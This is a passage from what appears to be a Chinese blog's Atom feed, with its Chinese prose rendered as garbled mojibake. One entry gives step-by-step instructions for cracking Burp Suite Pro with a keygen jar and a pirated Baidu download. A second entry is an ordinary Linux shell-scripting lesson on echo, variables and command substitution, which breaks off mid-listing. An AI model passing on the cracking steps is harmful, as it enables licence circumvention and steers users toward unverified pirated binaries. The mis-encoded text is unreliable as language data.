    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Burp-Suite-Pro-v2022-1-1çš„å®‰è£…"><a href="#Burp-Suite-Pro-v2022-1-1çš„å®‰è£…" class="headerlink" title="Burp_Suite_Pro_v2022.1.1çš„å®‰è£…"></a>Burp_Suite_Pro_v2022.1.1çš„å®‰è£…</h2><p>Burp_Suiteçš„ä½¿ç”¨èŒƒå›´è¿˜æ˜¯æ¯”è¾ƒå¹¿çš„ï¼Œå¯ä»¥æ‹¦æˆªåŒ…ã€ä¿®æ”¹åŒ…ç­‰ï¼Œæˆ‘ç›®å‰çš„åº”ç”¨å°±æ˜¯åšwebé¢˜çš„æ—¶å€™ç”¨åˆ°ã€‚è¿™æ¬¡ä»‹ç»çš„æ˜¯ä¸€ä¸ªå¾çˆ±å¤§ä½¬å‘çš„æ±‰åŒ–ä¸“ä¸šç ´è§£ç‰ˆï¼Œæºåœ°å€ï¼š<a href="https://www.52pojie.cn/thread-1585838-1-1.html">https://www.52pojie.cn/thread-1585838-1-1.html</a></p><h3 id="1ã€è½¯ä»¶åœ°å€"><a href="#1ã€è½¯ä»¶åœ°å€" class="headerlink" title="1ã€è½¯ä»¶åœ°å€"></a>1ã€è½¯ä»¶åœ°å€</h3><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1g5NuI1x0BbfiL_nM-xjKqQ">https://pan.baidu.com/s/1g5NuI1x0BbfiL_nM-xjKqQ</a><br>æå–ç ï¼šburp</p><h3 id="2ã€å®‰è£…"><a href="#2ã€å®‰è£…" class="headerlink" title="2ã€å®‰è£…"></a>2ã€å®‰è£…</h3><p>é¦–å…ˆè§£å‹ï¼Œå‹ç¼©åŒ…é‡Œå·²ç»é›†æˆäº†å¯¹åº”çš„javaç¯å¢ƒï¼Œæ‰€ä»¥ä¸éœ€è¦è‡ªå·±é…ç½®äº†ï¼Œä½†æ˜¯éœ€è¦ç”Ÿæˆå¯¹åº”çš„è®¸å¯è¯ã€‚</p><h4 id="2-1-æ‰“å¼€burp-loader-keygen-2020-1-jar"><a href="#2-1-æ‰“å¼€burp-loader-keygen-2020-1-jar" class="headerlink" title="2.1 æ‰“å¼€burp-loader-keygen-2020_1.jar"></a>2.1 æ‰“å¼€burp-loader-keygen-2020_1.jar</h4><p>æ‰“å¼€è¿™ä¸ªéœ€è¦Javaå·¥å…·ï¼Œè‡ªå·±ç”µè„‘å¦‚æœæ²¡æœ‰é…ç½®Javaç¯å¢ƒï¼Œéœ€è¦è‡ªå·±é…ç½®ä¸€ä¸‹ç¯å¢ƒå˜é‡ï¼Œå…·ä½“çš„æ•™ç¨‹ç½‘ä¸Šæœ‰å¾ˆå¤šï¼Œå°±æ˜¯æ·»åŠ ä¸€ä¸‹å¯¹åº”çš„ç¯å¢ƒå˜é‡ã€‚</p><p>ç„¶åæ‰“å¼€cmdä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-none"><code class="language-none">java -jar burp-loader-keygen-2020_1.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/tools/202202121945716.png"></p><p>è¿™æ ·å°±å¯ä»¥æ‰“å¼€æˆ‘ä»¬ç¥å¥‡çš„å¯†é’¥ç”Ÿæˆå™¨äº†ï¼Œå¦‚å›¾ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/tools/202202121945718.png"></p><h4 id="2-2-æ‰‹åŠ¨å®‰è£…"><a href="#2-2-æ‰‹åŠ¨å®‰è£…" class="headerlink" title="2.2 æ‰‹åŠ¨å®‰è£…"></a>2.2 æ‰‹åŠ¨å®‰è£…</h4><p>å…ˆæŠŠLisenseè¾“å…¥åˆ°è®¸å¯è¯æ¡†é‡Œï¼Œç„¶åç‚¹å‡»æ‰‹åŠ¨è§£å¯†éªŒè¯ã€‚</p><p>æ¥ç€æŠŠå‡ºç°çš„Requesté‚£ä¸€é•¿ä¸²å­—ç¬¦ä¸²ç²˜è´´åˆ°ä¸Šå›¾ä¸­çš„å¯¹åº”Requestä½ç½®ã€‚</p><p>ç„¶åå°±ä¼šå‡ºç°å¯¹åº”çš„Responseï¼Œå†æŠŠå®ƒç²˜è´´æˆ‘ä»¬çš„è½¯ä»¶ä¸­å°±ç ´è§£æˆåŠŸå’§ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/tools/202202121945719.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="å·¥å…·" scheme="https://huhu-myh.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="Burp_suite" scheme="https://huhu-myh.github.io/tags/Burp-suite/"/>
    
  </entry>
  
  <entry>
    <title>Linuxå­¦ä¹ -ç¬¬ä¹ç« </title>
    <link href="https://huhu-myh.github.io/posts/myh10016.html"/>
    <id>https://huhu-myh.github.io/posts/myh10016.html</id>
    <published>2022-02-09T12:02:21.000Z</published>
    <updated>2022-02-10T12:46:44.934Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ç¬¬ä¹ç« ï¼šæ„å»ºåŸºæœ¬è„šæœ¬"><a href="#ç¬¬ä¹ç« ï¼šæ„å»ºåŸºæœ¬è„šæœ¬" class="headerlink" title="ç¬¬ä¹ç« ï¼šæ„å»ºåŸºæœ¬è„šæœ¬"></a>ç¬¬ä¹ç« ï¼šæ„å»ºåŸºæœ¬è„šæœ¬</h2><h3 id="9-1-ä½¿ç”¨å¤šä¸ªå‘½ä»¤"><a href="#9-1-ä½¿ç”¨å¤šä¸ªå‘½ä»¤" class="headerlink" title="9.1 ä½¿ç”¨å¤šä¸ªå‘½ä»¤"></a>9.1 ä½¿ç”¨å¤šä¸ªå‘½ä»¤</h3><p>shellè„šæœ¬çš„å…³é”®åœ¨äº<font color="#FF5E3A" size="3">è¾“å…¥å¤šä¸ªå‘½ä»¤å¹¶å¤„ç†æ¯ä¸ªå‘½ä»¤çš„ç»“æœ</font>ï¼Œç”šè‡³éœ€è¦å°†ä¸€ä¸ªå‘½ä»¤çš„ç»“æœä¼ ç»™å¦ä¸€ä¸ªå‘½ä»¤ã€‚ shellå¯ä»¥è®©ä½ å°†å¤šä¸ªå‘½ä»¤ä¸²èµ·æ¥ï¼Œä¸€æ¬¡æ‰§è¡Œå®Œæˆã€‚  </p><p>å¦‚æœè¦<font color="#FF5E3A" size="3">ä¸¤ä¸ªå‘½ä»¤ä¸€èµ·è¿è¡Œ</font>ï¼Œå¯ä»¥æŠŠå®ƒä»¬æ”¾åœ¨åŒä¸€è¡Œä¸­ï¼Œå½¼æ­¤é—´ç”¨<strong>åˆ†å·</strong>éš”å¼€ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">myh@VM-16-11-debian:~$ <span class="token function">date</span><span class="token punctuation">;</span><span class="token function">who</span>Wed 09 Feb <span class="token number">2022</span> 08:15:29 PM HKTmyh      pts/1        <span class="token number">2022</span>-02-09 <span class="token number">20</span>:00 <span class="token punctuation">(</span><span class="token number">120.242</span>.132.71<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™å°±æ˜¯ä¸ªç®€å•çš„è„šæœ¬ï¼Œåªç”¨åˆ°äº†ä¸¤ä¸ªbash shellå‘½ä»¤ã€‚  </p><p>è¿™ç§æŠ€æœ¯å¯¹äºå°å‹è„šæœ¬å°šå¯ï¼Œä½†å®ƒæœ‰ä¸€ä¸ªå¾ˆå¤§çš„ç¼ºé™·ï¼šæ¯æ¬¡è¿è¡Œä¹‹å‰ï¼Œä½ éƒ½å¿…é¡»åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹è¾“å…¥æ•´ä¸ªå‘½ä»¤ã€‚å¯ä»¥å°†è¿™äº›<font color="#FF5E3A" size="3">å‘½ä»¤ç»„åˆæˆä¸€ä¸ªç®€å•çš„æ–‡æœ¬æ–‡ä»¶</font>ï¼Œè¿™æ ·å°±ä¸éœ€è¦åœ¨å‘½ä»¤è¡Œä¸­æ‰‹åŠ¨è¾“å…¥äº†ã€‚åœ¨éœ€è¦è¿è¡Œè¿™äº›å‘½ä»¤æ—¶ï¼Œåªç”¨è¿è¡Œè¿™ä¸ªæ–‡æœ¬æ–‡ä»¶å°±è¡Œäº†ã€‚  </p><h3 id="9-2-åˆ›å»º-shell-è„šæœ¬æ–‡ä»¶"><a href="#9-2-åˆ›å»º-shell-è„šæœ¬æ–‡ä»¶" class="headerlink" title="9.2 åˆ›å»º shell è„šæœ¬æ–‡ä»¶"></a>9.2 åˆ›å»º shell è„šæœ¬æ–‡ä»¶</h3><p>åœ¨åˆ›å»ºshellè„šæœ¬æ–‡ä»¶<code>touch test.sh</code>æ—¶ï¼Œ<font color="#FF5E3A" size="3">å¿…é¡»åœ¨æ–‡ä»¶çš„ç¬¬ä¸€è¡ŒæŒ‡å®šè¦ä½¿ç”¨çš„shell</font>ã€‚å…¶æ ¼å¼ä¸ºï¼š  </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token shebang important">#!/bin/bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨é€šå¸¸çš„shellè„šæœ¬ä¸­ï¼Œäº•å·ï¼ˆ #ï¼‰ç”¨ä½œæ³¨é‡Šè¡Œã€‚ shellå¹¶ä¸ä¼šå¤„ç†shellè„šæœ¬ä¸­çš„æ³¨é‡Šè¡Œã€‚ç„¶è€Œï¼Œshellè„šæœ¬æ–‡ä»¶çš„ç¬¬ä¸€è¡Œæ˜¯ä¸ªä¾‹å¤–ï¼Œ #åé¢çš„æƒŠå¹å·ä¼šå‘Šè¯‰shellç”¨å“ªä¸ªshellæ¥è¿è¡Œè„šæœ¬ã€‚  </p><p>åœ¨æŒ‡å®šäº†shellä¹‹åï¼Œå°±å¯ä»¥åœ¨æ–‡ä»¶çš„æ¯ä¸€è¡Œä¸­è¾“å…¥å‘½ä»¤ï¼Œç„¶ååŠ ä¸€ä¸ªå›è½¦ç¬¦ï¼š</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">!</span>/bin/bash<span class="token comment"># This script displays the date and who's logged on</span><span class="token function">date</span><span class="token function">who</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥æ ¹æ®éœ€è¦ï¼Œä½¿ç”¨åˆ†å·å°†ä¸¤ä¸ªå‘½ä»¤æ”¾åœ¨ä¸€è¡Œä¸Šï¼Œä½†åœ¨shellè„šæœ¬ä¸­ï¼Œä½ å¯ä»¥åœ¨ç‹¬ç«‹çš„è¡Œä¸­ä¹¦å†™å‘½ä»¤ã€‚ shellä¼šæŒ‰æ ¹æ®å‘½ä»¤åœ¨æ–‡ä»¶ä¸­å‡ºç°çš„é¡ºåºè¿›è¡Œå¤„ç†ã€‚  </p><p>ç°åœ¨è„šæœ¬å°±å˜å†™å¥½äº†ã€‚å¦‚æœç›´æ¥è¿è¡Œç»“æœå¯èƒ½ä¸å¤ªå¥½ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ test1bash: test1: <span class="token builtin class-name">command</span> not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç¬¬ä¸€ä¸ªéšœç¢æ˜¯è®©bash shellèƒ½æ‰¾åˆ°ä½ çš„è„šæœ¬æ–‡ä»¶ã€‚ shellä¼šé€šè¿‡PATHç¯å¢ƒå˜é‡æ¥æŸ¥æ‰¾å‘½ä»¤ã€‚å¿«é€ŸæŸ¥çœ‹ä¸€ä¸‹PATHç¯å¢ƒå˜é‡å°±å¯ä»¥å¼„æ¸…é—®é¢˜æ‰€åœ¨ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin:/home/user/bin <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è®©shellæ‰¾åˆ°test1è„šæœ¬ï¼Œåªéœ€é‡‡å–ä»¥ä¸‹ä¸¤ç§ä½œæ³•ä¹‹ä¸€ï¼š   </p><ul><li> å°†shellè„šæœ¬æ–‡ä»¶æ‰€å¤„çš„ç›®å½•æ·»åŠ åˆ°PATHç¯å¢ƒå˜é‡ä¸­ï¼›</li><li> åœ¨æç¤ºç¬¦ä¸­ç”¨ç»å¯¹æˆ–ç›¸å¯¹æ–‡ä»¶è·¯å¾„æ¥å¼•ç”¨shellè„šæœ¬æ–‡ä»¶ã€‚  </li></ul><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†ç”¨ç¬¬äºŒç§æ–¹å¼å°†è„šæœ¬æ–‡ä»¶çš„ç¡®åˆ‡ä½ç½®å‘Šè¯‰shellã€‚è®°ä½ï¼Œä¸ºäº†å¼•ç”¨å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¯ä»¥åœ¨shellä¸­ä½¿ç”¨å•ç‚¹æ“ä½œç¬¦ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ./test1bash: ./test1: Permission denied<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>shellæŒ‡æ˜äº†è¿˜æ²¡æœ‰æ‰§è¡Œæ–‡ä»¶çš„æƒé™ã€‚å¿«é€ŸæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶æƒé™å°±èƒ½æ‰¾åˆ°é—®é¢˜æ‰€åœ¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ls</span> -l test1-rw-rw-r-- <span class="token number">1</span> user user <span class="token number">73</span> Sep <span class="token number">24</span> <span class="token number">19</span>:56 test1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> ä¸‹ä¸€æ­¥æ˜¯é€šè¿‡chmodå‘½ä»¤ï¼ˆå‚è§ç¬¬7ç« ï¼‰èµ‹äºˆæ–‡ä»¶å±ä¸»æ‰§è¡Œæ–‡ä»¶çš„æƒé™ :</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># chmod 760 test1.sh</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ./test1.sh</span>Wed 09 Feb <span class="token number">2022</span> 08:36:03 PM HKTmyh      pts/1        <span class="token number">2022</span>-02-09 <span class="token number">20</span>:00 <span class="token punctuation">(</span><span class="token number">120.242</span>.132.71<span class="token punctuation">)</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ls -l</span>total <span class="token number">12</span>-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">0</span> Jan <span class="token number">25</span> <span class="token number">14</span>:28 cho-rw-r--r-- <span class="token number">1</span> root root <span class="token number">22</span> Jan <span class="token number">25</span> <span class="token number">14</span>:29 makefile-rwxrw---- <span class="token number">1</span> root root <span class="token number">21</span> Feb  <span class="token number">9</span> <span class="token number">20</span>:33 test1.sh-rw-r--r-- <span class="token number">1</span> myh  root <span class="token number">76</span> Feb  <span class="token number">8</span> <span class="token number">20</span>:32 test1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-3-æ˜¾ç¤ºæ¶ˆæ¯"><a href="#9-3-æ˜¾ç¤ºæ¶ˆæ¯" class="headerlink" title="9.3 æ˜¾ç¤ºæ¶ˆæ¯"></a>9.3 æ˜¾ç¤ºæ¶ˆæ¯</h4><p><code>echo</code>å‘½ä»¤å¯ä»¥æ˜¾ç¤ºæ–‡æœ¬æ¶ˆæ¯æ¥å‘Šè¯‰è„šæœ¬ç”¨æˆ·è„šæœ¬æ­£åœ¨åšä»€ä¹ˆ:</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">!</span>/bin/bash<span class="token comment"># This script displays the date and who's logged on</span><span class="token builtin class-name">echo</span> This is a test.<span class="token function">date</span><span class="token function">who</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>â€‹    é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸éœ€è¦ä½¿ç”¨å¼•å·å°†è¦æ˜¾ç¤ºçš„æ–‡æœ¬å­—ç¬¦ä¸²åˆ’å®šå‡ºæ¥ã€‚ä½†æœ‰æ—¶åœ¨å­—ç¬¦ä¸²ä¸­å‡ºç°å¼•å·çš„è¯éœ€è¦ç”¨å¦å¤–ä¸€ç§æ¥å°†å­—ç¬¦ä¸²åˆ’å®šèµ·æ¥ã€‚        </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">"This is a test to see if you're paying attention"</span>This is a <span class="token builtin class-name">test</span> to see <span class="token keyword">if</span> you<span class="token string">'re paying attention$ echo '</span>Rich says <span class="token string">"scripting is easy"</span>.'Rich says <span class="token string">"scripting is easy"</span><span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæƒ³æŠŠæ–‡æœ¬å­—ç¬¦ä¸²å’Œå‘½ä»¤è¾“å‡ºæ˜¾ç¤ºåœ¨åŒä¸€è¡Œä¸­ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿå¯ä»¥ç”¨<code>echo</code>è¯­å¥çš„<code>-n</code>å‚æ•°ã€‚åªè¦å°†ç¬¬ä¸€ä¸ª<code>echo</code>è¯­å¥æ”¹æˆè¿™æ ·å°±è¡Œï¼š  </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">!</span>/bin/bash<span class="token comment"># This script displays the date and who's logged on</span><span class="token builtin class-name">echo</span> -n <span class="token string">"The time and date are: "</span><span class="token function">date</span><span class="token builtin class-name">echo</span> -n <span class="token string">"Let's see who's logged into the system: "</span><span class="token function">who</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># ./test1.sh</span>The <span class="token function">time</span> and data are: Wed 09 Feb <span class="token number">2022</span> 08:52:32 PM HKTLet<span class="token string">'s see who'</span>s logged into the system: myh      pts/1        <span class="token number">2022</span>-02-09 <span class="token number">20</span>:00 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>echo</code>å‘½ä»¤æ˜¯shellè„šæœ¬ä¸­ä¸ç”¨æˆ·äº¤äº’çš„é‡è¦å·¥å…·ã€‚ä½ ä¼šå‘ç°åœ¨å¾ˆå¤šåœ°æ–¹éƒ½èƒ½ç”¨åˆ°å®ƒï¼Œå°¤å…¶æ˜¯éœ€è¦æ˜¾ç¤ºè„šæœ¬ä¸­å˜é‡çš„å€¼çš„æ—¶å€™ã€‚  </p><h3 id="9-4-ä½¿ç”¨å˜é‡"><a href="#9-4-ä½¿ç”¨å˜é‡" class="headerlink" title="9.4 ä½¿ç”¨å˜é‡"></a>9.4 ä½¿ç”¨å˜é‡</h3><h4 id="9-4-1-ç¯å¢ƒå˜é‡"><a href="#9-4-1-ç¯å¢ƒå˜é‡" class="headerlink" title="9.4.1 ç¯å¢ƒå˜é‡"></a>9.4.1 ç¯å¢ƒå˜é‡</h4><p>åœ¨ç¯å¢ƒå˜é‡åç§°ä¹‹å‰åŠ ä¸Šç¾å…ƒç¬¦ï¼ˆ $ï¼‰æ¥ä½¿ç”¨è¿™äº›ç¯å¢ƒå˜é‡:</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">root@VM-16-11-debian:/tmp/test<span class="token comment"># cat test2.sh </span><span class="token comment">#!/bin/bash</span><span class="token comment"># Display the user information from the system.</span><span class="token builtin class-name">echo</span> <span class="token string">"User info for userid: <span class="token environment constant">$USER</span>"</span><span class="token builtin class-name">echo</span> <span class="token environment constant">UID</span><span class="token builtin class-name">:</span> <span class="token environment constant">$UID</span><span class="token builtin class-name">echo</span> <span class="token environment constant">HOME</span><span class="token builtin class-name">:</span> <span class="token environment constant">$HOME</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># chmod 764 test2.sh </span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ls -l</span>total <span class="token number">16</span>-rw-r--r-- <span class="token number">1</span> root root   <span class="token number">0</span> Jan <span class="token number">25</span> <span class="token number">14</span>:28 cho-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">22</span> Jan <span class="token number">25</span> <span class="token number">14</span>:29 makefile-rwxrw---- <span class="token number">1</span> root root <span class="token number">106</span> Feb  <span class="token number">9</span> <span class="token number">20</span>:52 test1.sh-rw-r--r-- <span class="token number">1</span> myh  root  <span class="token number">76</span> Feb  <span class="token number">8</span> <span class="token number">20</span>:32 test1.txt-rwxrw-r-- <span class="token number">1</span> root root <span class="token number">127</span> Feb <span class="token number">10</span> <span class="token number">19</span>:45 test2.shroot@VM-16-11-debian:/tmp/test<span class="token comment"># ./test2.sh</span>User info <span class="token keyword">for</span> userid: myh<span class="token environment constant">UID</span><span class="token builtin class-name">:</span> <span class="token number">0</span><span class="token environment constant">HOME</span><span class="token builtin class-name">:</span> /root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>echoå‘½ä»¤ä¸­çš„ç¯å¢ƒå˜é‡ä¼šåœ¨è„šæœ¬è¿è¡Œæ—¶æ›¿æ¢æˆå½“å‰å€¼ã€‚  </p><h4 id="9-4-2-ç”¨æˆ·å˜é‡"><a href="#9-4-2-ç”¨æˆ·å˜é‡" class="headerlink" title="9.4.2 ç”¨æˆ·å˜é‡"></a>9.4.2 ç”¨æˆ·å˜é‡</h4><p>å®šä¹‰å˜é‡å…è®¸ä¸´æ—¶å­˜å‚¨æ•°æ®å¹¶åœ¨æ•´ä¸ªè„šæœ¬ä¸­ä½¿ç”¨ï¼Œä»è€Œä½¿shellè„šæœ¬çœ‹èµ·æ¥æ›´åƒä¸€ä¸ªçœŸæ­£çš„è®¡ç®—æœºç¨‹åºã€‚  </p><p>ç”¨æˆ·å˜é‡å¯ä»¥æ˜¯ï¼š</p><ul><li>ä»»ä½•ç”±å­—æ¯ã€æ•°å­—æˆ–ä¸‹åˆ’çº¿ç»„æˆçš„æ–‡æœ¬å­—ç¬¦ä¸²ï¼Œé•¿åº¦ä¸è¶…è¿‡20ä¸ªã€‚</li><li>åŒºåˆ†å¤§å°å†™ã€‚</li><li>ä½¿ç”¨ç­‰å·å°†å€¼èµ‹ç»™ç”¨æˆ·å˜é‡ã€‚åœ¨å˜é‡ã€ç­‰å·å’Œå€¼ä¹‹é—´ä¸èƒ½å‡ºç°ç©ºæ ¼</li></ul><p>shellè„šæœ¬ä¼šè‡ªåŠ¨å†³å®šå˜é‡å€¼çš„æ•°æ®ç±»å‹ã€‚åœ¨è„šæœ¬çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸé‡Œï¼Œ shellè„šæœ¬ä¸­å®šä¹‰çš„å˜é‡ä¼šä¸€ç›´ä¿æŒç€å®ƒä»¬çš„å€¼ï¼Œä½†åœ¨shellè„šæœ¬ç»“æŸæ—¶ä¼šè¢«åˆ é™¤æ‰ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># cat test3.sh </span><span class="token comment">#!/bin/bash</span><span class="token comment">#This is a test.</span><span class="token assign-left variable">name</span><span class="token operator">=</span>myh<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$name</span> love Linux!"</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ./test3.sh </span>myh love Linux<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‡è¦çš„æ˜¯è¦è®°ä½ï¼Œ<font color="#FF5E3A" size="3">å¼•ç”¨ä¸€ä¸ªå˜é‡å€¼æ—¶éœ€è¦ä½¿ç”¨ç¾å…ƒç¬¦ï¼Œè€Œå¼•ç”¨å˜é‡æ¥å¯¹å…¶è¿›è¡Œèµ‹å€¼æ—¶åˆ™ä¸è¦ä½¿ç”¨ç¾å…ƒç¬¦</font>ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> test4<span class="token comment">#!/bin/bash</span><span class="token comment"># assigning a variable value to another variable</span><span class="token assign-left variable">value1</span><span class="token operator">=</span><span class="token number">10</span><span class="token assign-left variable">value2</span><span class="token operator">=</span><span class="token variable">$value1</span><span class="token builtin class-name">echo</span> The resulting value is <span class="token variable">$value2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-4-3-å‘½ä»¤æ›¿æ¢"><a href="#9-4-3-å‘½ä»¤æ›¿æ¢" class="headerlink" title="9.4.3 å‘½ä»¤æ›¿æ¢"></a>9.4.3 å‘½ä»¤æ›¿æ¢</h4><p>ä»å‘½ä»¤è¾“å‡ºä¸­æå–ä¿¡æ¯ï¼Œå¹¶å°†å…¶èµ‹ç»™å˜é‡ï¼š</p><ul><li>åå¼•å·å­—ç¬¦ï¼ˆ `ï¼‰  </li><li>$()æ ¼å¼  </li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> test5<span class="token comment">#!/bin/bash</span><span class="token assign-left variable">testing</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span><span class="token variable">)</span></span><span class="token builtin class-name">echo</span> <span class="token string">"The date and time are: "</span> <span class="token variable">$testing</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å˜é‡testingè·å¾—äº†dateå‘½ä»¤çš„è¾“å‡ºï¼Œç„¶åä½¿ç”¨echoè¯­å¥æ˜¾ç¤ºå‡ºå®ƒçš„å€¼ã€‚è¿è¡Œè¿™ä¸ªshellè„šæœ¬ç”Ÿæˆå¦‚ä¸‹è¾“å‡ºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ./test5The <span class="token function">date</span> and <span class="token function">time</span> are: Mon Jan <span class="token number">31</span> <span class="token number">20</span>:10:25 EDT <span class="token number">2014</span>$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  ä¸‹é¢è¿™ä¸ªä¾‹å­å¾ˆå¸¸è§ï¼Œå®ƒåœ¨è„šæœ¬ä¸­é€šè¿‡å‘½ä»¤æ›¿æ¢è·å¾—å½“å‰æ—¥æœŸå¹¶ç”¨å®ƒæ¥ç”Ÿæˆå”¯ä¸€æ–‡ä»¶åï¼š</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># copy the /usr/bin directory listing to a log file</span><span class="token assign-left variable">today</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%y%m%d<span class="token variable">)</span></span><span class="token function">ls</span> /usr/bin -al <span class="token operator">&gt;</span> log.<span class="token variable">$today</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>todayå˜é‡æ˜¯è¢«èµ‹äºˆæ ¼å¼åŒ–åçš„dateå‘½ä»¤çš„è¾“å‡ºã€‚è¿™æ˜¯æå–æ—¥æœŸä¿¡æ¯æ¥ç”Ÿæˆæ—¥å¿—æ–‡ä»¶åå¸¸ç”¨çš„ä¸€ç§æŠ€æœ¯ã€‚ <code>+%y%m%d</code>æ ¼å¼å‘Šè¯‰dateå‘½ä»¤å°†æ—¥æœŸæ˜¾ç¤ºä¸ºä¸¤ä½æ•°çš„å¹´æœˆæ—¥çš„ç»„åˆã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># date +%y%m%d</span><span class="token number">220210</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™ä¸ªè„šæœ¬å°†æ—¥æœŸå€¼èµ‹ç»™ä¸€ä¸ªå˜é‡ï¼Œä¹‹åå†å°†å…¶ä½œä¸ºæ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ã€‚æ–‡ä»¶è‡ªèº«å«æœ‰ç›®å½•åˆ—è¡¨çš„<strong>é‡å®šå‘è¾“å‡º</strong>ï¼ˆå°†åœ¨9.5èŠ‚è¯¦ç»†è®¨è®ºï¼‰ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-rw-r--r-- <span class="token number">1</span> user user <span class="token number">769</span> Jan 